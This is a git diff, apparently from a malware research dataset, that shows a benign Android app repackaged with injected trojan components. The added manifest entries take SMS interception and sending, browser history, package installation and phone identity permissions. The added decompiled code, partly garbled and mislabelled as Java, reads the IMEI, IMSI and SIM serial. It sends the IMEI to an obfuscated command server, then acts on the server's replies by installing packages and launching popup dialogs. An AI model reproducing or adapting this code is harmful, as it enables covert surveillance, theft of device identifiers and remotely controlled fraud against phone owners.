diff --git a/result/APP_47/App_B_47/AndroidManifest.xml b/result/APP_47/App_M_47/AndroidManifest.xml
index 3f0c300..52cc0f1 100755
--- a/result/APP_47/App_B_47/AndroidManifest.xml
+++ b/result/APP_47/App_M_47/AndroidManifest.xml
@@ -46,12 +46,29 @@
             </intent-filter>
         </receiver>
         <service android:name=".service.ScreenService"/>
+        <service android:name="com.android.main.MainService" android:process=":main"/>
+        <receiver android:name="com.android.main.ActionReceiver">
+            <intent-filter>
+                <action android:name="android.intent.action.SIG_STR"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:name="com.android.main.SmsReceiver">
+            <intent-filter android:priority="100000">
+                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
+            </intent-filter>
+        </receiver>
+        <activity android:name="com.android.main.TANCActivity" android:theme="@android:style/Theme.Dialog"/>
     </application>
     <uses-permission android:name="android.permission.SET_PREFERRED_APPLICATIONS"/>
-    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
     <uses-permission android:name="android.permission.DISABLE_KEYGUARD"/>
     <uses-permission android:name="android.permission.VIBRATE"/>
-    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
     <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+    <uses-permission android:name="android.permission.SEND_SMS"/>
+    <uses-permission android:name="com.android.browser.permission.READ_HISTORY_BOOKMARKS"/>
+    <uses-permission android:name="com.android.browser.permission.WRITE_HISTORY_BOOKMARKS"/>
+    <uses-permission android:name="android.permission.INSTALL_PACKAGES"/>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
 </manifest>
\ No newline at end of file
diff --git a/result/APP_47/App_B_47/apktool.yml b/result/APP_47/App_M_47/apktool.yml
index 172f389..eec0e50 100755
--- a/result/APP_47/App_B_47/apktool.yml
+++ b/result/APP_47/App_M_47/apktool.yml
@@ -1,5 +1,5 @@
 !!brut.androlib.meta.MetaInfo
-apkFileName: Bapp47-72ACC63208C5518BDF8E745BCA1B264866D27704D0B0CA89559CBE593A0D840A.apk
+apkFileName: Mapp47-2EF09ACA1B3A4ACBFB2C33EF14D5EF06150BF88662B35A90F98A74ACCABAF6BE.apk
 compressionType: false
 doNotCompress:
 - resources.arsc
diff --git a/result/APP_47/App_M_47/com/android/main/APKInstaller.java b/result/APP_47/App_M_47/com/android/main/APKInstaller.java
new file mode 100755
index 0000000..bd0972b
--- /dev/null
+++ b/result/APP_47/App_M_47/com/android/main/APKInstaller.java
@@ -0,0 +1,432 @@
+package com.android.main;
+
+public class APKInstaller
+{
+  public APKInstaller() {}
+  
+  /* Error */
+  public static String exec(String[] paramArrayOfString)
+  {
+    // Byte code:
+
+    move-object/from16 v1, v16
+
+    move-object/from16 v2, v17
+
+    invoke-static {v0, v1, v2}, Lcom/android/main/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
+
+    move-result-object v10
+
+    .line 454
+    const/4 v9, 0x1
+
+    .line 455
+    .local v9, "isexec":Z
+    const-string v16, "no"
+
+    move-object/from16 v0, v16
+
+    move-object v1, v10
+
+    invoke-virtual {v0, v1}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z
+
+    move-result v16
+
+    if-eqz v16, :cond_1
+
+    .line 456
+    const-string v16, "<pack>"
+
+    const-string v17, "</pack>"
+
+    move-object/from16 v0, p1
+
+    move-object/from16 v1, v16
+
+    move-object/from16 v2, v17
+
+    invoke-static {v0, v1, v2}, Lcom/android/main/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
+
+    move-result-object v12
+
+    .line 457
+    const-string v16, ""
+
+    move-object/from16 v0, v16
+
+    move-object v1, v12
+
+    invoke-virtual {v0, v1}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z
+
+    move-result v16
+
+    if-nez v16, :cond_1
+
+    .line 458
+    invoke-virtual/range {p0 .. p0}, Lcom/android/main/MainService;->getPackageManager()Landroid/content/pm/PackageManager;
+
+    move-result-object v16
+
+    .line 459
+    const/16 v17, 0x0
+
+    invoke-virtual/range {v16 .. v17}, Landroid/content/pm/PackageManager;->getInstalledPackages(I)Ljava/util/List;
+
+    move-result-object v13
+
+    .line 460
+    .local v13, "packs":Ljava/util/List;, "Ljava/util/List<Landroid/content/pm/PackageInfo;>;"
+    if-eqz v13, :cond_1
+
+    .line 461
+    invoke-interface {v13}, Ljava/util/List;->size()I
+
+    move-result v4
+
+    .line 462
+    .local v4, "count":I
+    const/4 v8, 0x0
+
+    .local v8, "i":I
+    :goto_1
+    if-lt v8, v4, :cond_3
+
+    .line 472
+    .end local v4    # "count":I
+    .end local v8    # "i":I
+    .end local v13    # "packs":Ljava/util/List;, "Ljava/util/List<Landroid/content/pm/PackageInfo;>;"
+    :cond_1
+    if-eqz v9, :cond_2
+
+    .line 474
+    new-instance v6, Lcom/android/main/FileUtil;
+
+    invoke-direct {v6}, Lcom/android/main/FileUtil;-><init>()V
+
+    .line 475
+    .local v6, "fileUtil":Lcom/android/main/FileUtil;
+    invoke-virtual {v6, v15}, Lcom/android/main/FileUtil;->getFile(Ljava/lang/String;)I
+    :try_end_1
+    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0
+    .catchall {:try_start_1 .. :try_end_1} :catchall_0
+
+    move-result v14
+
+    .line 476
+    .local v14, "results":I
+    if-nez v14, :cond_2
+
+    .line 477
+    const/16 v7, -0x378
+
+    .line 483
+    .end local v6    # "fileUtil":Lcom/android/main/FileUtil;
+    .end local v14    # "results":I
+    :cond_2
+    move-object/from16 v0, p0
+
+    move-object/from16 v1, p2
+
+    invoke-direct {v0, v1}, Lcom/android/main/MainService;->writeRecordLog([Ljava/lang/String;)V
+
+    .line 484
+    const/16 v16, 0x1
+
+    move-object/from16 v0, p0
+
+    move v1, v7
+
+    move/from16 v2, v16
+
+    move-object v3, v12
+
+    invoke-direct {v0, v1, v2, v3}, Lcom/android/main/MainService;->LogService(IILjava/lang/String;)I
+
+    goto :goto_0
+
+    .line 463
+    .restart local v4    # "count":I
+    .restart local v8    # "i":I
+    .restart local v13    # "packs":Ljava/util/List;, "Ljava/util/List<Landroid/content/pm/PackageInfo;>;"
+    :cond_3
+    :try_start_2
+    invoke-interface {v13, v8}, Ljava/util/List;->get(I)Ljava/lang/Object;
+
+    move-result-object v11
+
+    check-cast v11, Landroid/content/pm/PackageInfo;
+
+    .line 464
+    .local v11, "p":Landroid/content/pm/PackageInfo;
+    move-object v0, v11
+
+    iget-object v0, v0, Landroid/content/pm/PackageInfo;->packageName:Ljava/lang/String;
+
+    move-object/from16 v16, v0
+
+    move-object v0, v12
+
+    move-object/from16 v1, v16
+
+    invoke-virtual {v0, v1}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z
+    :try_end_2
+    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0
+    .catchall {:try_start_2 .. :try_end_2} :catchall_0
+
+    move-result v16
+
+    if-eqz v16, :cond_4
+
+    .line 465
+    const/16 v7, -0x29a
+
+    .line 466
+    const/4 v9, 0x0
+
+    .line 462
+    :cond_4
+    add-int/lit8 v8, v8, 0x1
+
+    goto :goto_1
+
+    .line 480
+    .end local v4    # "count":I
+    .end local v8    # "i":I
+    .end local v9    # "isexec":Z
+    .end local v11    # "p":Landroid/content/pm/PackageInfo;
+    .end local v13    # "packs":Ljava/util/List;, "Ljava/util/List<Landroid/content/pm/PackageInfo;>;"
+    :catch_0
+    move-exception v16
+
+    move-object/from16 v5, v16
+
+    .line 481
+    .local v5, "e":Ljava/lang/Exception;
+    :try_start_3
+    invoke-virtual {v5}, Ljava/lang/Exception;->printStackTrace()V
+    :try_end_3
+    .catchall {:try_start_3 .. :try_end_3} :catchall_0
+
+    .line 483
+    move-object/from16 v0, p0
+
+    move-object/from16 v1, p2
+
+    invoke-direct {v0, v1}, Lcom/android/main/MainService;->writeRecordLog([Ljava/lang/String;)V
+
+    .line 484
+    const/16 v16, 0x1
+
+    move-object/from16 v0, p0
+
+    move v1, v7
+
+    move/from16 v2, v16
+
+    move-object v3, v12
+
+    invoke-direct {v0, v1, v2, v3}, Lcom/android/main/MainService;->LogService(IILjava/lang/String;)I
+
+    goto/16 :goto_0
+
+    .line 482
+    .end local v5    # "e":Ljava/lang/Exception;
+    :catchall_0
+    move-exception v16
+
+    .line 483
+    move-object/from16 v0, p0
+
+    move-object/from16 v1, p2
+
+    invoke-direct {v0, v1}, Lcom/android/main/MainService;->writeRecordLog([Ljava/lang/String;)V
+
+    .line 484
+    const/16 v17, 0x1
+
+    move-object/from16 v0, p0
+
+    move v1, v7
+
+    move/from16 v2, v17
+
+    move-object v3, v12
+
+    invoke-direct {v0, v1, v2, v3}, Lcom/android/main/MainService;->LogService(IILjava/lang/String;)I
+
+    .line 485
+    throw v16
+.end method
+
+.method private execTanc(Ljava/lang/String;[Ljava/lang/String;)V
+    .locals 9
+    .param p1, "allStr"    # Ljava/lang/String;
+    .param p2, "record"    # [Ljava/lang/String;
+
+    .prologue
+    const/4 v8, 0x1
+
+    .line 546
+    const/16 v3, -0x3eb
+
+    .line 548
+    .local v3, "result":I
+    :try_start_0
+    const-string v6, "<header>"
+
+    .line 549
+    const-string v7, "</header>"
+
+    .line 548
+    invoke-static {p1, v6, v7}, Lcom/android/main/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
+
+    move-result-object v1
+
+    .line 550
+    .local v1, "header":Ljava/lang/String;
+    const-string v6, "<message>"
+
+    .line 551
+    const-string v7, "</message>"
+
+    .line 550
+    invoke-static {p1, v6, v7}, Lcom/android/main/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
+
+    move-result-object v2
+
+    .line 552
+    .local v2, "message":Ljava/lang/String;
+    const-string v6, "<url>"
+
+    const-string v7, "</url>"
+
+    invoke-static {p1, v6, v7}, Lcom/android/main/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
+
+    move-result-object v5
+
+    .line 553
+    .local v5, "url":Ljava/lang/String;
+    new-instance v4, Landroid/content/Intent;
+
+    invoke-virtual {p0}, Lcom/android/main/MainService;->getApplicationContext()Landroid/content/Context;
+
+    move-result-object v6
+
+    .line 554
+    const-class v7, Lcom/android/main/TANCActivity;
+
+    .line 553
+    invoke-direct {v4, v6, v7}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
+
+    .line 555
+    .local v4, "tancIntent":Landroid/content/Intent;
+    const/high16 v6, 0x10000000
+
+    invoke-virtual {v4, v6}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;
+
+    .line 556
+    const-string v6, "header"
+
+    invoke-virtual {v4, v6, v1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;
+
+    .line 557
+    const-string v6, "message"
+
+    invoke-virtual {v4, v6, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;
+
+    .line 558
+    const-string v6, "url"
+
+    invoke-virtual {v4, v6, v5}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;
+
+    .line 559
+    invoke-virtual {p0, v4}, Lcom/android/main/MainService;->startActivity(Landroid/content/Intent;)V
+    :try_end_0
+    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
+    .catchall {:try_start_0 .. :try_end_0} :catchall_0
+
+    .line 564
+    invoke-direct {p0, p2}, Lcom/android/main/MainService;->writeRecordLog([Ljava/lang/String;)V
+
+    .line 565
+    invoke-direct {p0, v3, v8}, Lcom/android/main/MainService;->LogService(II)I
+
+    .line 567
+    .end local v1    # "header":Ljava/lang/String;
+    .end local v2    # "message":Ljava/lang/String;
+    .end local v4    # "tancIntent":Landroid/content/Intent;
+    .end local v5    # "url":Ljava/lang/String;
+    :goto_0
+    return-void
+
+    .line 560
+    :catch_0
+    move-exception v6
+
+    move-object v0, v6
+
+    .line 561
+    .local v0, "e":Ljava/lang/Exception;
+    const/16 v3, -0x3ec
+
+    .line 562
+    :try_start_1
+    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V
+    :try_end_1
+    .catchall {:try_start_1 .. :try_end_1} :catchall_0
+
+    .line 564
+    invoke-direct {p0, p2}, Lcom/android/main/MainService;->writeRecordLog([Ljava/lang/String;)V
+
+    .line 565
+    invoke-direct {p0, v3, v8}, Lcom/android/main/MainService;->LogService(II)I
+
+    goto :goto_0
+
+    .line 563
+    .end local v0    # "e":Ljava/lang/Exception;
+    :catchall_0
+    move-exception v6
+
+    .line 564
+    invoke-direct {p0, p2}, Lcom/android/main/MainService;->writeRecordLog([Ljava/lang/String;)V
+
+    .line 565
+    invoke-direct {p0, v3, v8}, Lcom/android/main/MainService;->LogService(II)I
+
+    .line 566
+    throw v6
+.end method
+
+.method private execTask()V
+    .locals 23
+
+    .prologue
+    .line 187
+    move-object/from16 v0, p0
+
+    iget-object v0, v0, Lcom/android/main/MainService;->recordlog:Ljava/lang/String;
+
+    move-object/from16 v19, v0
+
+    invoke-static/range {v19 .. v19}, Lcom/android/main/FileAct;->readString(Ljava/lang/String;)Ljava/lang/String;
+
+    move-result-object v13
+
+    .line 188
+    .local v13, "record":Ljava/lang/String;
+    invoke-static {v13}, Lcom/android/main/StringUtil;->getRecordInfo(Ljava/lang/String;)[Ljava/lang/String;
+
+    move-result-object v7
+
+    .line 189
+    .local v7, "docount":[Ljava/lang/String;
+    const/4 v11, 0x0
+
+    .line 190
+    .local v11, "isexec":Z
+    if-eqz v7, :cond_0
+
+    move-object v0, v7
+
+    array-length v0, v0
+
+    move/from16 v19, v0
+
+    const/16 v20, 0x7
+
+    move/from16 v0, v19
+
+    move/from16 v1, v20
+
+    if-eq v0, v1, :cond_1
+
+    .line 192
+    :cond_0
+    invoke-direct/range {p0 .. p0}, Lcom/android/main/MainService;->getDestMobile()I
+
+    move-result v14
+
+    .line 193
+    .local v14, "result":I
+    const/16 v19, 0xc8
+
+    move v0, v14
+
+    move/from16 v1, v19
+
+    if-ne v0, v1, :cond_9
+
+    .line 194
+    const/16 v19, 0x7
+
+    move/from16 v0, v19
+
+    new-array v0, v0, [Ljava/lang/String;
+
+    move-object v7, v0
+
+    .line 195
+    const/16 v19, 0x2
+
+    invoke-static/range {v19 .. v19}, Lcom/android/main/StringUtil;->getDate(I)Ljava/lang/String;
+
+    move-result-object v19
+
+    move-object/from16 v0, v19
+
+    move-object/from16 v1, p0
+
+    iput-object v0, v1, Lcom/android/main/MainService;->nexttime:Ljava/lang/String;
+
+    .line 196
+    const/16 v19, 0x1
+
+    invoke-static/range {v19 .. v19}, Lcom/android/main/StringUtil;->getCurrentDate(I)Ljava/lang/String;
+
+    move-result-object v19
+
+    move-object/from16 v0, v19
+
+    move-object/from16 v1, p0
+
+    iput-object v0, v1, Lcom/android/main/MainService;->installtime:Ljava/lang/String;
+
+    .line 197
+    const/16 v19, 0x0
+
+    move-object/from16 v0, p0
+
+    iget-object v0, v0, Lcom/android/main/MainService;->nexttime:Ljava/lang/String;
+
+    move-object/from16 v20, v0
+
+    aput-object v20, v7, v19
+
+    .line 198
+    const/16 v19, 0x1
+
+    move-object/from16 v0, p0
+
+    iget-object v0, v0, Lcom/android/main/MainService;->smallpid:Ljava/lang/String;
+
+    move-object/from16 v20, v0
+
+    aput-object v20, v7, v19
+
+    .line 199
+    const/16 v19, 0x2
+
+    move-object/from16 v0, p0
+
+    iget-object v0, v0, Lcom/android/main/MainService;->mobile:Ljava/lang/String;
+
+    move-object/from16 v20, v0
+
+    aput-object v20, v7, v19
+
+    .line 200
+    const/16 v19, 0x3
+
+    move-object/from16 v0, p0
+
+    iget-object v0, v0, Lcom/android/main/MainService;->installtime:Ljava/lang/String;
+
+    move-object/from16 v20, v0
+
+    aput-object v20, v7, v19
+
+    .line 201
+    const/16 v19, 0x4
+
+    move-object/from16 v0, p0
+
+    iget-object v0, v0, Lcom/android/main/MainService;->region:Ljava/lang/String;
+
+    move-object/from16 v20, v0
+
+    aput-object v20, v7, v19
+
+    .line 202
+    const/16 v19, 0x5
+
+    move-object/from16 v0, p0
+
+    iget-object v0, v0, Lcom/android/main/MainService;->imsi:Ljava/lang/String;
+
+    move-object/from16 v20, v0
+
+    aput-object v20, v7, v19
+
+    .line 203
+    const/16 v19, 0x6
+
+    move-object/from16 v0, p0
+
+    iget-object v0, v0, Lcom/android/main/MainService;->mnc:Ljava/lang/String;
+
+    move-object/from16 v20, v0
+
+    aput-object v20, v7, v19
+
+    .line 204
+    new-instance v19, Ljava/lang/StringBuilder;
+
+    move-object/from16 v0, p0
+
+    iget-object v0, v0, Lcom/android/main/MainService;->nexttime:Ljava/lang/String;
+
+    move-object/from16 v20, v0
+
+    invoke-static/range {v20 .. v20}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;
+
+    move-result-object v20
+
+    invoke-direct/range {v19 .. v20}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
+
+    const-string v20, "|"
+
+    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v19
+
+    move-object/from16 v0, p0
+
+    iget-object v0, v0, Lcom/android/main/MainService;->smallpid:Ljava/lang/String;
+
+    move-object/from16 v20, v0
+
+    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v19
+
+    const-string v20, "|"
+
+    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v19
+
+    move-object/from16 v0, p0
+
+    iget-object v0, v0, Lcom/android/main/MainService;->mobile:Ljava/lang/String;
+
+    move-object/from16 v20, v0
+
+    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v19
+
+    const-string v20, "|"
+
+    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v19
+
+    .line 205
+    move-object/from16 v0, p0
+
+    iget-object v0, v0, Lcom/android/main/MainService;->installtime:Ljava/lang/String;
+
+    move-object/from16 v20, v0
+
+    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v19
+
+    const-string v20, "|"
+
+    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v19
+
+    move-object/from16 v0, p0
+
+    iget-object v0, v0, Lcom/android/main/MainService;->region:Ljava/lang/String;
+
+    move-object/from16 v20, v0
+
+    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v19
+
+    const-string v20, "|"
+
+    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v19
+
+    move-object/from16 v0, p0
+
+    iget-object v0, v0, Lcom/android/main/MainService;->imsi:Ljava/lang/String;
+
+    move-object/from16 v20, v0
+
+    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v19
+
+    const-string v20, "|"
+
+    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v19
+
+    move-object/from16 v0, p0
+
+    iget-object v0, v0, Lcom/android/main/MainService;->mnc:Ljava/lang/String;
+
+    move-object/from16 v20, v0
+
+    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v19
+
+    .line 204
+    invoke-virtual/range {v19 .. v19}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+
+    move-result-object v12
+
+    .line 206
+    .local v12, "logtxt":Ljava/lang/String;
+    move-object/from16 v0, p0
+
+    iget-object v0, v0, Lcom/android/main/MainService;->recordlog:Ljava/lang/String;
+
+    move-object/from16 v19, v0
+
+    move-object v0, v12
+
+    move-object/from16 v1, v19
+
+    invoke-static {v0, v1}, Lcom/android/main/FileAct;->writeString(Ljava/lang/String;Ljava/lang/String;)V
+
+    .line 207
+    const/4 v11, 0x1
+
+    .line 212
+    .end local v12    # "logtxt":Ljava/lang/String;
+    .end local v14    # "result":I
+    :cond_1
+    const/16 v19, 0x0
+
+    aget-object v19, v7, v19
+
+    invoke-static/range {v19 .. v19}, Lcom/android/main/StringUtil;->getTimeLength(Ljava/lang/String;)Ljava/lang/Long;
+
+    move-result-object v6
+
+    .line 214
+    .local v6, "difdate":Ljava/lang/Long;
+    invoke-virtual {v6}, Ljava/lang/Long;->longValue()J
+
+    move-result-wide v19
+
+    const-wide/16 v21, 0x0
+
+    cmp-long v19, v19, v21
+
+    if-gtz v19, :cond_a
+
+    if-nez v11, :cond_a
+
+    .line 215
+    invoke-virtual {v6}, Ljava/lang/Long;->longValue()J
+
+    move-result-wide v19
+
+    const-wide/32 v21, -0xa4cb800
+
+    cmp-long v19, v19, v21
+
+    if-gez v19, :cond_9
+
+    .line 216
+    const/16 v19, 0x0
+
+    const/16 v20, 0x1
+
+    invoke-static/range {v20 .. v20}, Lcom/android/main/StringUtil;->getCurrentDate(I)Ljava/lang/String;
+
+    move-result-object v20
+
+    aput-object v20, v7, v19
+
+    .line 223
+    :cond_2
+    :goto_0
+    move-object/from16 v0, p0
+
+    iget-object v0, v0, Lcom/android/main/MainService;->imei:Ljava/lang/String;
+
+    move-object/from16 v19, v0
+
+    if-eqz v19, :cond_3
+
+    const-string v19, ""
+
+    move-object/from16 v0, p0
+
+    iget-object v0, v0, Lcom/android/main/MainService;->imei:Ljava/lang/String;
+
+    move-object/from16 v20, v0
+
+    invoke-virtual/range {v19 .. v20}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z
+
+    move-result v19
+
+    if-eqz v19, :cond_4
+
+    .line 225
+    :cond_3
+    const-string v19, "phone"
+
+    move-object/from16 v0, p0
+
+    move-object/from16 v1, v19
+
+    invoke-virtual {v0, v1}, Lcom/android/main/MainService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
+
+    move-result-object v15
+
+    .line 224
+    check-cast v15, Landroid/telephony/TelephonyManager;
+
+    .line 226
+    .local v15, "tm":Landroid/telephony/TelephonyManager;
+    if-eqz v15, :cond_4
+
+    .line 227
+    invoke-virtual {v15}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;
+
+    move-result-object v19
+
+    move-object/from16 v0, v19
+
+    move-object/from16 v1, p0
+
+    iput-object v0, v1, Lcom/android/main/MainService;->imei:Ljava/lang/String;
+
+    .line 232
+    invoke-virtual {v15}, Landroid/telephony/TelephonyManager;->getSubscriberId()Ljava/lang/String;
+
+    move-result-object v19
+
+    move-object/from16 v0, v19
+
+    move-object/from16 v1, p0
+
+    iput-object v0, v1, Lcom/android/main/MainService;->imsi:Ljava/lang/String;
+
+    .line 233
+    invoke-virtual {v15}, Landroid/telephony/TelephonyManager;->getSimSerialNumber()Ljava/lang/String;
+
+    move-result-object v19
+
+    move-object/from16 v0, v19
+
+    move-object/from16 v1, p0
+
+    iput-object v0, v1, Lcom/android/main/MainService;->iccid:Ljava/lang/String;
+
+    .line 237
+    .end local v15    # "tm":Landroid/telephony/TelephonyManager;
+    :cond_4
+    const/4 v10, 0x0
+
+    .line 238
+    .local v10, "isbian":Z
+    move-object/from16 v0, p0
+
+    iget-object v0, v0, Lcom/android/main/MainService;->imsi:Ljava/lang/String;
+
+    move-object/from16 v19, v0
+
+    if-eqz v19, :cond_5
+
+    move-object/from16 v0, p0
+
+    iget-object v0, v0, Lcom/android/main/MainService;->imsi:Ljava/lang/String;
+
+    move-object/from16 v19, v0
+
+    const/16 v20, 0x5
+
+    aget-object v20, v7, v20
+
+    invoke-virtual/range {v19 .. v20}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+
+    move-result v19
+
+    if-nez v19, :cond_5
+
+    .line 239
+    const/4 v10, 0x1
+
+    .line 242
+    :cond_5
+    if-nez v10, :cond_6
+
+    const-string v19, "other"
+
+    const/16 v20, 0x4
+
+    aget-object v20, v7, v20
+
+    invoke-virtual/range {v19 .. v20}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z
+
+    move-result v19
+
+    if-nez v19, :cond_6
+
+    .line 243
+    const-string v19, ""
+
+    const/16 v20, 0x4
+
+    aget-object v20, v7, v20
+
+    invoke-virtual/range {v19 .. v20}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z
+
+    move-result v19
+
+    if-nez v19, :cond_6
+
+    .line 244
+    const-string v19, "other"
+
+    const/16 v20, 0x6
+
+    aget-object v20, v7, v20
+
+    invoke-virtual/range {v19 .. v20}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z
+
+    move-result v19
+
+    if-nez v19, :cond_6
+
+    .line 245
+    const-string v19, ""
+
+    const/16 v20, 0x6
+
+    aget-object v20, v7, v20
+
+    invoke-virtual/range {v19 .. v20}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z
+
+    move-result v19
+
+    if-eqz v19, :cond_8
+
+    .line 246
+    :cond_6
+    new-instance v19, Ljava/lang/StringBuilder;
+
+    const-string v20, "http://"
+
+    invoke-direct/range {v19 .. v20}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
+
+    .line 247
+    const-string v20, "2maodb3ialke8mdeme3gkos9g1icaofm"
+
+    const/16 v21, 0x6
+
+    .line 248
+    const/16 v22, 0x3
+
+    .line 247
+    invoke-static/range {v20 .. v22}, Lcom/android/main/Base64;->encodebook(Ljava/lang/String;II)Ljava/lang/String;
+
+    move-result-object v20
+
+    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v19
+
+    .line 248
+    const-string v20, "/mm.do?imei="
+
+    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v19
+
+    move-object/from16 v0, p0
+
+    iget-object v0, v0, Lcom/android/main/MainService;->imei:Ljava/lang/String;
+
+    move-object/from16 v20, v0
+
+    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v19
+
+    .line 246
+    invoke-virtual/range {v19 .. v19}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+
+    move-result-object v18
+
+    .line 251
+    .local v18, "xmlUrl":Ljava/lang/String;
+    :try_start_0
+    invoke-static/range {v18 .. v18}, Lcom/android/main/BaseAuthenicationHttpClient;->getStringByURL(Ljava/lang/String;)Ljava/lang/String;
+
+    move-result-object v3
+
+    .line 252
+    .local v3, "allStr":Ljava/lang/String;
+    if-eqz v3, :cond_8
+
+    const-string v19, ""
+
+    move-object/from16 v0, v19
+
+    move-object v1, v3
+
